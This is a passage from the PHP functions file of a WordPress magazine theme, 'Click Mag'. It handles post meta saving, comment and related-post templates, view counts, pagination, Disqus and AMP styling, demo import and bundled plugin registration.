	elseif ( '' == $new_meta_value && $meta_value )
		delete_post_meta( $post_id, $meta_key, $meta_value );
} }

/* Save the meta box's post metadata. */
if ( !function_exists( 'mvp_save_img_loc_meta' ) ) {
function mvp_save_img_loc_meta( $post_id, $post ) {

	/* Verify the nonce before proceeding. */
	if ( !isset( $_POST['mvp_img_loc_nonce'] ) || !wp_verify_nonce( $_POST['mvp_img_loc_nonce'], 'mvp_save_img_loc_meta' ) )
		return $post_id;

	/* Get the post type object. */
	$post_type = get_post_type_object( $post->post_type );

	/* Check if the current user has permission to edit the post. */
	if ( !current_user_can( $post_type->cap->edit_post, $post_id ) )
		return $post_id;

	/* Get the posted data and sanitize it for use as an HTML class. */
	$new_meta_value = ( isset( $_POST['mvp-img-loc'] ) ? balanceTags( $_POST['mvp-img-loc'] ) : '' );

	/* Get the meta key. */
	$meta_key = 'mvp_img_loc';

	/* Get the meta value of the custom field key. */
	$meta_value = get_post_meta( $post_id, $meta_key, true );

	/* If a new meta value was added and there was no previous value, add it. */
	if ( $new_meta_value && '' == $meta_value )
		add_post_meta( $post_id, $meta_key, $new_meta_value, true );

	/* If the new meta value does not match the old value, update it. */
	elseif ( $new_meta_value && $new_meta_value != $meta_value )
		update_post_meta( $post_id, $meta_key, $new_meta_value );

	/* If there is no new meta value but an old value exists, delete it. */
	elseif ( '' == $new_meta_value && $meta_value )
		delete_post_meta( $post_id, $meta_key, $meta_value );
} }

/* Save the meta box's post metadata. */
if ( !function_exists( 'mvp_save_featured_image_meta' ) ) {
function mvp_save_featured_image_meta( $post_id, $post ) {

	/* Verify the nonce before proceeding. */
	if ( !isset( $_POST['mvp_featured_image_nonce'] ) || !wp_verify_nonce( $_POST['mvp_featured_image_nonce'], 'mvp_save_featured_image_meta' ) )
		return $post_id;

	/* Get the post type object. */
	$post_type = get_post_type_object( $post->post_type );

	/* Check if the current user has permission to edit the post. */
	if ( !current_user_can( $post_type->cap->edit_post, $post_id ) )
		return $post_id;

	/* Get the posted data and sanitize it for use as an HTML class. */
	$new_meta_value = ( isset( $_POST['mvp-featured-image'] ) ? balanceTags( $_POST['mvp-featured-image'] ) : '' );

	/* Get the meta key. */
	$meta_key = 'mvp_featured_image';

	/* Get the meta value of the custom field key. */
	$meta_value = get_post_meta( $post_id, $meta_key, true );

	/* If a new meta value was added and there was no previous value, add it. */
	if ( $new_meta_value && '' == $meta_value )
		add_post_meta( $post_id, $meta_key, $new_meta_value, true );

	/* If the new meta value does not match the old value, update it. */
	elseif ( $new_meta_value && $new_meta_value != $meta_value )
		update_post_meta( $post_id, $meta_key, $new_meta_value );

	/* If there is no new meta value but an old value exists, delete it. */
	elseif ( '' == $new_meta_value && $meta_value )
		delete_post_meta( $post_id, $meta_key, $meta_value );
} }

/* Save the meta box's post metadata. */
if ( !function_exists( 'mvp_save_post_gallery_meta' ) ) {
function mvp_save_post_gallery_meta( $post_id, $post ) {

	/* Verify the nonce before proceeding. */
	if ( !isset( $_POST['mvp_post_gallery_nonce'] ) || !wp_verify_nonce( $_POST['mvp_post_gallery_nonce'], 'mvp_save_post_gallery_meta' ) )
		return $post_id;

	/* Get the post type object. */
	$post_type = get_post_type_object( $post->post_type );

	/* Check if the current user has permission to edit the post. */
	if ( !current_user_can( $post_type->cap->edit_post, $post_id ) )
		return $post_id;

	/* Get the posted data and sanitize it for use as an HTML class. */
	$new_meta_value = ( isset( $_POST['mvp-post-gallery'] ) ? balanceTags( $_POST['mvp-post-gallery'] ) : '' );

	/* Get the meta key. */
	$meta_key = 'mvp_post_gallery';

	/* Get the meta value of the custom field key. */
	$meta_value = get_post_meta( $post_id, $meta_key, true );

	/* If a new meta value was added and there was no previous value, add it. */
	if ( $new_meta_value && '' == $meta_value )
		add_post_meta( $post_id, $meta_key, $new_meta_value, true );

	/* If the new meta value does not match the old value, update it. */
	elseif ( $new_meta_value && $new_meta_value != $meta_value )
		update_post_meta( $post_id, $meta_key, $new_meta_value );

	/* If there is no new meta value but an old value exists, delete it. */
	elseif ( '' == $new_meta_value && $meta_value )
		delete_post_meta( $post_id, $meta_key, $meta_value );
} }

/////////////////////////////////////
// Comments
/////////////////////////////////////

if ( !function_exists( 'mvp_comment' ) ) {
function mvp_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case '' :
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<div class="comment-wrapper" id="comment-<?php comment_ID(); ?>">
			<div class="comment-inner">
				<div class="comment-avatar">
					<?php echo get_avatar( $comment, 46 ); ?>
				</div>
				<div class="commentmeta">
					<p class="comment-meta-1">
						<?php printf( esc_html__( '%s ', 'click-mag'), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?>
					</p>
					<p class="comment-meta-2">
						<?php echo get_comment_date(); ?> <?php esc_html_e( 'at', 'click-mag'); ?> <?php echo get_comment_time(); ?>
						<?php edit_comment_link( esc_html__( 'Edit', 'click-mag'), '(' , ')'); ?>
					</p>
				</div>
				<div class="text">
					<?php if ( $comment->comment_approved == '0' ) : ?>
						<p class="waiting_approval"><?php esc_html_e( 'Your comment is awaiting moderation.', 'click-mag' ); ?></p>
					<?php endif; ?>
					<div class="c">
						<?php comment_text(); ?>
					</div>
				</div><!-- .text  -->
				<div class="clear"></div>
				<div class="comment-reply"><span class="reply"><?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?></span></div>
			</div><!-- comment-inner  -->
		</div><!-- comment-wrapper  -->
	<?php
			break;
		case 'pingback'  :
		case 'trackback' :
	?>
	<li class="post pingback">
		<p><?php esc_html_e( 'Pingback:', 'click-mag' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( esc_html__( 'Edit', 'click-mag' ), ' ' ); ?></p>
	<?php
			break;
	endswitch;
}
}

if ( !function_exists( 'mvpClickCommmentButton' ) ) {
function mvpClickCommmentButton($disqus_shortname){
    global $post;
    echo '
    <script type="text/javascript">
	jQuery(document).ready(function($) {
  	  $(".comment-click-'.$post->ID.'").on("click", function(){
  	    $(".com-click-id-'.$post->ID.'").show();
	    $(".disqus-thread-'.$post->ID.'").show();
  	    $(".com-but-'.$post->ID.'").hide();
	  });
	});
    </script>';
}
}

/////////////////////////////////////
// Related Posts
/////////////////////////////////////

if ( !function_exists( 'mvp_RelatedPosts' ) ) {
function mvp_RelatedPosts() {
    global $post;
    $orig_post = $post;

    $tags = wp_get_post_tags($post->ID);
    if ($tags) {

	$slider_exclude = esc_html(get_option('mvp_feat_posts_tags'));
	$tag_exclude_slider = get_term_by('slug', $slider_exclude, 'post_tag');
	if (!empty( $tag_exclude_slider )) {
		$tag_id_exclude_slider =  $tag_exclude_slider->term_id;
       		$tag_ids = array();
        	foreach($tags as $individual_tag) {
			$excluded_tags = array($tag_id_exclude_slider);
      			if (in_array($individual_tag->term_id,$excluded_tags)) continue;
 			$tag_ids[] = $individual_tag->term_id;
		}
	} else {
       		$tag_ids = array();
        	foreach($tags as $individual_tag) $tag_ids[] = $individual_tag->term_id;
	}
        $args=array(
            'tag__in' => $tag_ids,
	    'order' => 'DESC',
	    'orderby' => 'date',
            'post__not_in' => array($post->ID),
            'posts_per_page'=> 4,
            'ignore_sticky_posts'=> 1
        );
        $my_query = new WP_Query( $args );
        if( $my_query->have_posts() ) { ?>
            <div id="mvp-related-posts" class="left relative">
			<ul class="mvp-related-posts-list left related">
            		<?php while( $my_query->have_posts() ) { $my_query->the_post(); ?>
            			<li>
                		<div class="mvp-related-img left relative">
					<?php if (  (function_exists('has_post_thumbnail')) && (has_post_thumbnail())  ) { ?>
					<a href="<?php the_permalink(); ?>" rel="bookmark" title="<?php the_title(); ?>">
						<?php the_post_thumbnail('mvp-mid-thumb', array( 'class' => 'mvp-reg-img' )); ?>
						<?php the_post_thumbnail('mvp-small-thumb', array( 'class' => 'mvp-mob-img' )); ?>
					</a>
					<?php if ( has_post_format( 'video' )) { ?>
						<div class="mvp-feat-vid-but">
							<i class="fa fa-play fa-3"></i>
						</div><!--mvpfeat-vid-but-->
					<?php } else if ( has_post_format( 'gallery' )) { ?>
						<div class="mvp-feat-gal-but">
							<i class="fa fa-camera fa-3"></i>
						</div><!--mvpfeat-gal-but-->
					<?php } ?>
					<?php } ?>
				</div><!--related-img-->
				<div class="mvp-related-text left relative">
					<a href="<?php the_permalink() ?>"><?php the_title(); ?></a>
				</div><!--related-text-->
            			</li>
            		<?php }
            echo '</ul></div>';
        }
    }
    $post = $orig_post;
    wp_reset_query();
}
}

/////////////////////////////////////
// Popular Posts
/////////////////////////////////////

if ( !function_exists( 'getCrunchifyPostViews' ) ) {
function getCrunchifyPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 View";
    }
    return $count.' Views';
}
}

if ( !function_exists( 'setCrunchifyPostViews' ) ) {
function setCrunchifyPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
}

/////////////////////////////////////
// Pagination
/////////////////////////////////////

if ( !function_exists( 'pagination' ) ) {
function pagination($pages = '', $range = 4)
{
     $showitems = ($range * 2)+1;

     global $paged;
     if(empty($paged)) $paged = 1;

     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }

     if(1 != $pages)
     {
         echo "<div class=\"pagination\"><span>".__( 'Page', 'click-mag' )." ".$paged." ".__( 'of', 'click-mag' )." ".$pages."</span>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo; ".__( 'First', 'click-mag' )."</a>";
         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo; ".__( 'Previous', 'click-mag' )."</a>";

         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "<span class=\"current\">".$i."</span>":"<a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a>";
             }
         }

         if ($paged < $pages && $showitems < $pages) echo "<a href=\"".get_pagenum_link($paged + 1)."\">".__( 'Next', 'click-mag' )." &rsaquo;</a>";
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>".__( 'Last', 'click-mag' )." &raquo;</a>";
         echo "</div>\n";
     }
}
}

/////////////////////////////////////
// Disqus Comments
/////////////////////////////////////

$disqus_id = get_option('mvp_disqus_id'); if (isset($disqus_id)) {
if ( !function_exists( 'mvp_disqus_embed' ) ) {
function mvp_disqus_embed($disqus_shortname) {
    global $post;
    wp_enqueue_script('disqus_embed','//'.$disqus_shortname.'.disqus.com/embed.js');
    echo '<div id="disqus_thread" class="disqus-thread-'.$post->ID.'"></div>
    <script type="text/javascript">
        var disqus_shortname = "'.$disqus_shortname.'";
        var disqus_title = "'.$post->post_title.'";
        var disqus_url = "'.get_permalink($post->ID).'";
        var disqus_identifier = "'.$disqus_shortname.'-'.$post->ID.'";
    </script>';
}
}
}

/////////////////////////////////////
// Remove Pages From Search Results
/////////////////////////////////////

if ( !is_admin() ) {

function mvp_SearchFilter($query) {
if ($query->is_search) {
$query->set('post_type', 'post');
}
return $query;
}

add_filter('pre_get_posts','mvp_SearchFilter');

}

/////////////////////////////////////
// Miscellaneous
/////////////////////////////////////

// Place Wordpress Admin Bar Above Main Navigation

if ( is_user_logged_in() ) {
	if ( is_admin_bar_showing() ) {
	function mvp_admin_bar() {
		echo "
			<style type='text/css'>
			.mvp-fixed,
			#mvp-nav-soc-bar {top: 32px !important;}
			</style>
		";
	}
	add_action( 'wp_head', 'mvp_admin_bar' );
	}
}

// Set Content Width
if ( ! isset( $content_width ) ) $content_width = 1000;

// Add RSS links to <head> section
add_theme_support( 'automatic-feed-links' );

add_action('init', 'do_output_buffer');
function do_output_buffer() {
        ob_start();
}

/////////////////////////////////////
// Google AMP
/////////////////////////////////////

$mvp_enable_amp = get_option('mvp_amp'); if ($mvp_enable_amp == "true") {

add_filter( 'amp_post_template_file', 'mvp_amp_set_custom_template', 10, 3 );
function mvp_amp_set_custom_template( $file, $type, $post ) {
	if ( 'single' === $type ) {
		$file = dirname( __FILE__ ) . '/amp-single.php';
	}
	return $file;
}

add_action( 'amp_post_template_head', 'isa_remove_amp_google_fonts', 2 );
function isa_remove_amp_google_fonts() {
    remove_action( 'amp_post_template_head', 'amp_post_template_add_fonts' );
}

add_action('amp_post_template_head','mvp_amp_google_font');
 function mvp_amp_google_font( $amp_template ) {
	$mvp_featured_font = get_option('mvp_featured_font');
	$mvp_amp_featured_font = preg_replace("/ /","+",$mvp_featured_font);
	$mvp_heading_font = get_option('mvp_heading_font');
	$mvp_amp_heading_font = preg_replace("/ /","+",$mvp_heading_font);
	$mvp_content_font = get_option('mvp_content_font');
	$mvp_amp_content_font = preg_replace("/ /","+",$mvp_content_font);
	$mvp_menu_font = get_option('mvp_menu_font');
	$mvp_amp_menu_font = preg_replace("/ /","+",$mvp_menu_font);
 ?>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Advent Pro:700|Open Sans:700|<?php echo $mvp_amp_featured_font; ?>:100,200,300,400,500,600,700,800,900|<?php echo $mvp_amp_heading_font; ?>:100,200,300,400,500,600,700,800,900|<?php echo $mvp_amp_content_font; ?>:100,200,300,400,500,600,700,800,900|<?php echo $mvp_amp_menu_font; ?>:100,200,300,400,500,600,700,800,900&subset=arabic,latin,latin-ext,cyrillic,cyrillic-ext,greek-ext,greek,vietnamese">
 <?php
 }

add_action( 'amp_post_template_css', 'mvp_amp_my_additional_css_styles' );
function mvp_amp_my_additional_css_styles( $amp_template ) {
	$wallad = get_option('mvp_wall_ad');
	$primarycolor = get_option('mvp_primary_theme');
	$topnavbg = get_option('mvp_top_nav_bg');
	$topnavtext = get_option('mvp_top_nav_text');
	$topnavhover = get_option('mvp_top_nav_hover');
	$botnavbg = get_option('mvp_bot_nav_bg');
	$botnavtext = get_option('mvp_bot_nav_text');
	$botnavhover = get_option('mvp_bot_nav_hover');
	$link = get_option('mvp_link_color');
	$link2 = get_option('mvp_link_hover');
	$featured_font = get_option('mvp_featured_font');
	$title_font = get_option('mvp_title_font');
	$heading_font = get_option('mvp_heading_font');
	$content_font = get_option('mvp_content_font');
	$menu_font = get_option('mvp_menu_font');
	$mvp_customcss = get_option('mvp_customcss');
	?>
#mvp-foot-copy a {
	color: <?php echo $link; ?>;
	}

a,
a:visited,
.post-info-name a {
	color: <?php echo $link; ?>;
	}

a:hover {
	color: <?php echo $link2; ?>;
	}

.mvp-fly-top:hover,
.mvp-vid-box-wrap,
ul.mvp-soc-mob-list li.mvp-soc-mob-com,
#mvp-comments-button a,
#mvp-comments-button span.mvp-comment-but-text {
	background: <?php echo $primarycolor; ?>;
	}

nav.mvp-fly-nav-menu ul li.menu-item-has-children:after,
.mvp-feat1-left-wrap span.mvp-cd-cat,
.mvp-widget-feat1-top-story span.mvp-cd-cat,
.mvp-widget-feat2-left-cont span.mvp-cd-cat,
.mvp-widget-dark-feat span.mvp-cd-cat,
.mvp-widget-dark-sub span.mvp-cd-cat,
.mvp-vid-wide-text span.mvp-cd-cat,
.mvp-feat2-top-text span.mvp-cd-cat,
.mvp-feat3-main-story span.mvp-cd-cat,
.mvp-feat3-sub-text span.mvp-cd-cat,
.mvp-feat4-main-text span.mvp-cd-cat,
span.mvp-cd-cat,
h4.mvp-widget-home-title {
	color: <?php echo $primarycolor; ?>;
	}

#searchform input,
.mvp-authors-name {
	border-bottom: 1px solid <?php echo $primarycolor; ?>;
	}

.mvp-fly-top:hover {
	border-top: 1px solid <?php echo $primarycolor; ?>;
	border-left: 1px solid <?php echo $primarycolor; ?>;
	border-bottom: 1px solid <?php echo $primarycolor; ?>;
	}

ul.mvp-feat1-list-buts li.active span.mvp-feat1-list-but,
span.mvp-widget-home-title,
span.mvp-post-cat,
span.mvp-feat1-pop-head {
	background: <?php echo $primarycolor; ?>;
	}

.mvp-widget-feat2-side-more-but,
.woocommerce .star-rating span:before,
span.mvp-prev-next-label,
.mvp-cat-date-wrap .sticky {
	color: <?php echo $primarycolor; ?>;
	}

#mvp-main-nav-top,
#mvp-fly-wrap,
.mvp-soc-mob-right,
#mvp-main-nav-small-cont {
	background: <?php echo $topnavbg; ?>;
	}

#mvp-main-nav-small .mvp-fly-but-wrap span,
#mvp-main-nav-small .mvp-search-but-wrap span,
.mvp-nav-top-left .mvp-fly-but-wrap span,
#mvp-fly-wrap .mvp-fly-but-wrap span {
	background: <?php echo $topnavtext; ?>;
	}

.mvp-nav-top-right .mvp-nav-search-but,
span.mvp-fly-soc-head,
.mvp-soc-mob-right i,
#mvp-main-nav-small span.mvp-nav-search-but,
#mvp-main-nav-small .mvp-nav-menu ul li a,
nav.mvp-fly-nav-menu ul li a  {
	color: <?php echo $topnavtext; ?>;
	}

#mvp-main-nav-small .mvp-nav-menu ul li.menu-item-has-children a:after {
	border-color: <?php echo $topnavtext; ?> transparent transparent transparent;
	}

#mvp-nav-top-wrap span.mvp-nav-search-but:hover,
#mvp-main-nav-small span.mvp-nav-search-but:hover {
	color: <?php echo $topnavhover; ?>;
	}

#mvp-nav-top-wrap .mvp-fly-but-wrap:hover span,
#mvp-main-nav-small .mvp-fly-but-wrap:hover span,
span.mvp-woo-cart-num:hover {
	background: <?php echo $topnavhover; ?>;
	}

#mvp-main-nav-bot-cont {
	background: <?php echo $botnavbg; ?>;
	}

#mvp-nav-bot-wrap .mvp-fly-but-wrap span,
#mvp-nav-bot-wrap .mvp-search-but-wrap span {
	background: <?php echo $botnavtext; ?>;
	}

#mvp-nav-bot-wrap span.mvp-nav-search-but,
#mvp-nav-bot-wrap .mvp-nav-menu ul li a {
	color: <?php echo $botnavtext; ?>;
	}

#mvp-nav-bot-wrap .mvp-nav-menu ul li.menu-item-has-children a:after {
	border-color: <?php echo $botnavtext; ?> transparent transparent transparent;
	}

.mvp-nav-menu ul li:hover a {
	border-bottom: 5px solid <?php echo $botnavhover; ?>;
	}

#mvp-nav-bot-wrap .mvp-fly-but-wrap:hover span {
	background: <?php echo $botnavhover; ?>;
	}

#mvp-nav-bot-wrap span.mvp-nav-search-but:hover {
	color: <?php echo $botnavhover; ?>;
	}

body,
nav.mvp-fly-nav-menu ul li a,
.mvp-ad-label,
.mvp-post-tags a,
.mvp-post-tags a:visited,
span.mvp-author-box-name a,
#mvp-author-box-text p,
.mvp-post-gallery-text p,
ul.mvp-soc-mob-list li span,
span.mvp-fly-soc-head,
span.mvp-prev-next-label,
span.mvp-post-add-link-but,
span.mvp-widget-home-title2,
.wp-caption,
#mvp-content-main p.wp-caption-text,
.gallery-caption,
.mvp-post-add-main p.wp-caption-text,
.protected-post-form input {
	font-family: '<?php echo $content_font; ?>', sans-serif;
	}

.mvp-blog-story-text p,
span.mvp-author-page-desc,
#mvp-404 p,
.mvp-widget-feat1-bot-text p,
.mvp-widget-feat2-left-text p,
.mvp-flex-story-text p,
.mvp-search-text p,
#mvp-content-main p,
.mvp-post-add-main p,
.rwp-summary,
.rwp-u-review__comment,
.mvp-feat5-mid-main-text p,
.mvp-feat5-small-main-text p {
	font-family: '<?php echo $content_font; ?>', sans-serif;
	}

.mvp-nav-menu ul li a,
nav.mvp-fly-nav-menu ul li a,
#mvp-foot-menu ul li a {
	font-family: '<?php echo $menu_font; ?>', sans-serif;
	}

h1.mvp-post-title,
h1.mvp-post-title-wide,
#mvp-content-main blockquote p,
.mvp-post-add-main blockquote p,
#mvp-404 h1,
.mvp-related-text p,
.mvp-post-more-text p {
	font-family: '<?php echo $featured_font; ?>', sans-serif;
	}

span.mvp-feat1-pop-head,
.mvp-feat1-pop-text:before,
span.mvp-feat1-list-but,
h4.mvp-widget-home-title,
.mvp-widget-feat2-side-more,
span.mvp-post-cat,
span.mvp-page-head,
h1.mvp-author-top-head,
.mvp-authors-name,
#mvp-comments-button a,
#mvp-comments-button span.mvp-comment-but-text,
#mvp-content-main h1,
#mvp-content-main h2,
#mvp-content-main h3,
#mvp-content-main h4,
#mvp-content-main h5,
#mvp-content-main h6,
.mvp-post-tags-header,
.mvp-post-tags a,
span.mvp-cd-cat,
span.mvp-post-excerpt,
.mvp-author-info-text,
#mvp-foot-copy p,
span.mvp-feat-caption {
	font-family: '<?php echo $heading_font; ?>', sans-serif;
	}
					
	<?php
}
	
}

/////////////////////////////////////
// WooCommerce
/////////////////////////////////////

add_theme_support( 'woocommerce' );
add_theme_support( 'wc-product-gallery-zoom' );
add_theme_support( 'wc-product-gallery-lightbox' );
add_theme_support( 'wc-product-gallery-slider' );

/////////////////////////////////////
// Demo Import
/////////////////////////////////////

function ocdi_import_files() {
  return array(
    array(
      'import_file_name'             => 'Click Mag Demo Import',
      'local_import_file'            => trailingslashit( get_template_directory() ) . 'import/clickmag.xml',
      'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'import/clickmag.wie',
      'import_preview_image_url'     => trailingslashit( get_template_directory() ) . 'screenshot.png',
      'preview_url'                  => 'http://www.mvpthemes.com/clickmag',
    ),
  );
}
add_filter( 'pt-ocdi/import_files', 'ocdi_import_files' );

function ocdi_after_import_setup() {
    // Assign menus to their locations.
    $main_menu = get_term_by( 'name', 'Main Menu', 'nav_menu' );

    set_theme_mod( 'nav_menu_locations', array(
            'main-menu' => $main_menu->term_id,
        )
    );

    // Assign front page and posts page (blog page).
    $front_page_id = get_page_by_title( 'Home' );

    update_option( 'show_on_front', 'page' );
    update_option( 'page_on_front', $front_page_id->ID );

}
add_action( 'pt-ocdi/after_import', 'ocdi_after_import_setup' );


/////////////////////////////////////
// Bundled Plugins
/////////////////////////////////////

require_once get_template_directory() . '/plugins/class-tgm-plugin-activation.php';

add_action( 'tgmpa_register', 'mvp_register_required_plugins' );

function mvp_register_required_plugins() {

	$plugins = array(

		array(
			'name'               => 'MVP Social Fields',
			'slug'               => 'mvp-social-fields',
			'source'             => get_template_directory() . '/plugins/mvp-social-fields.zip',
			'required'           => true,
			'version'            => '',
			'force_activation'   => false,
			'force_deactivation' => false,
		),

		array(
			'name'               => 'One Click Demo Import',
			'slug'               => 'one-click-demo-import',
			'source'             => get_template_directory() . '/plugins/one-click-demo-import.zip',
			'required'           => false,
			'version'            => '',
			'force_activation'   => false,
			'force_deactivation' => false,
		),
		
		array(
			'name'               => 'Google AMP',
			'slug'               => 'mvp-google-amp',
			'source'             => get_template_directory() . '/plugins/amp.zip',
			'required'           => false,
			'version'            => '',
			'force_activation'   => false,
			'force_deactivation' => false,
		),

		array(
			'name'               => 'Reviewer Plugin',
			'slug'               => 'reviewer',
			'source'             => get_template_directory() . '/plugins/reviewer.zip',
			'required'           => false,
			'version'            => '',
			'force_activation'   => false,
			'force_deactivation' => false,
		),

		array(
			'name'               => 'Theia Post Slider',
			'slug'               => 'theia-post-slider',
			'source'             => get_template_directory() . '/plugins/theia-post-slider.zip',
			'required'           => false,
			'version'            => '',
			'force_activation'   => false,
			'force_deactivation' => false,
		),

		array(
			'name'               => 'Theia Sticky Sidebar',
			'slug'               => 'theia-sticky-sidebar',
			'source'             => get_template_directory() . '/plugins/theia-sticky-sidebar.zip',
			'required'           => false,
			'version'            => '',
			'force_activation'   => false,
			'force_deactivation' => false,
		),

	);

	$config = array(
		'id'           => 'click-mag',                 // Unique ID for hashing notices for multiple instances of TGMPA.
		'default_path' => '',                      // Default absolute path to bundled plugins.
		'menu'         => 'tgmpa-install-plugins', // Menu slug.
		'has_notices'  => true,                    // Show admin notices or not.
		'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
		'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
		'is_automatic' => true,                   // Automatically activate plugins after installation or not.
		'message'      => '',                      // Message to output right before the plugins table.

		/*
		'strings'      => array(
			'page_title'                      => __( 'Install Required Plugins', 'click-mag' ),
			'menu_title'                      => __( 'Install Plugins', 'click-mag' ),
			/* translators: %s: plugin name. * /
			'installing'                      => __( 'Installing Plugin: %s', 'click-mag' ),
			/* translators: %s: plugin name. * /
			'updating'                        => __( 'Updating Plugin: %s', 'click-mag' ),
			'oops'                            => __( 'Something went wrong with the plugin API.', 'click-mag' ),
			'notice_can_install_required'     => _n_noop(
				/* translators: 1: plugin name(s). * /
				'This theme requires the following plugin: %1$s.',
				'This theme requires the following plugins: %1$s.',
				'click-mag'
			),
			'notice_can_install_recommended'  => _n_noop(
				/* translators: 1: plugin name(s). * /
				'This theme recommends the following plugin: %1$s.',
				'This theme recommends the following plugins: %1$s.',
				'click-mag'
			),
			'notice_ask_to_update'            => _n_noop(
				/* translators: 1: plugin name(s). * /
				'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.',
				'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.',
				'click-mag'
			),
			'notice_ask_to_update_maybe'      => _n_noop(
				/* translators: 1: plugin name(s). * /
				'There is an update available for: %1$s.',
				'There are updates available for the following plugins: %1$s.',
				'click-mag'
			),
			'notice_can_activate_required'    => _n_noop(
				/* translators: 1: plugin name(s). * /
				'The following required plugin is currently inactive: %1$s.',
				'The following required plugins are currently inactive: %1$s.',
				'click-mag'
			),
			'notice_can_activate_recommended' => _n_noop(
				/* translators: 1: plugin name(s). * /
				'The following recommended plugin is currently inactive: %1$s.',
				'The following recommended plugins are currently inactive: %1$s.',
				'click-mag'
			),
			'install_link'                    => _n_noop(
				'Begin installing plugin',
				'Begin installing plugins',
				'click-mag'
			),
			'update_link' 					  => _n_noop(
				'Begin updating plugin',
				'Begin updating plugins',
				'click-mag'
			),
			'activate_link'                   => _n_noop(
				'Begin activating plugin',
				'Begin activating plugins',
				'click-mag'
			),
			'return'                          => __( 'Return to Required Plugins Installer', 'click-mag' ),
			'plugin_activated'                => __( 'Plugin activated successfully.', 'click-mag' ),
			'activated_successfully'          => __( 'The following plugin was activated successfully:', 'click-mag' ),
			/* translators: 1: plugin name. * /
			'plugin_already_active'           => __( 'No action taken. Plugin %1$s was already active.', 'click-mag' ),
			/* translators: 1: plugin name. * /
			'plugin_needs_higher_version'     => __( 'Plugin not activated. A higher version of %s is needed for this theme. Please update the plugin.', 'click-mag' ),
			/* translators: 1: dashboard link. * /
			'complete'                        => __( 'All plugins installed and activated successfully. %1$s', 'click-mag' ),
			'dismiss'                         => __( 'Dismiss this notice', 'click-mag' ),
			'notice_cannot_install_activate'  => __( 'There are one or more required or recommended plugins to install, update or activate.', 'click-mag' ),
			'contact_admin'                   => __( 'Please contact the administrator of this site for help.', 'click-mag' ),

			'nag_type'                        => '', // Determines admin notice type - can only be one of the typical WP notice classes, such as 'updated', 'update-nag', 'notice-warning', 'notice-info' or 'error'. Some of which may not work as expected in older WP versions.
		),
		*/
	);

	tgmpa( $plugins, $config );
}

?>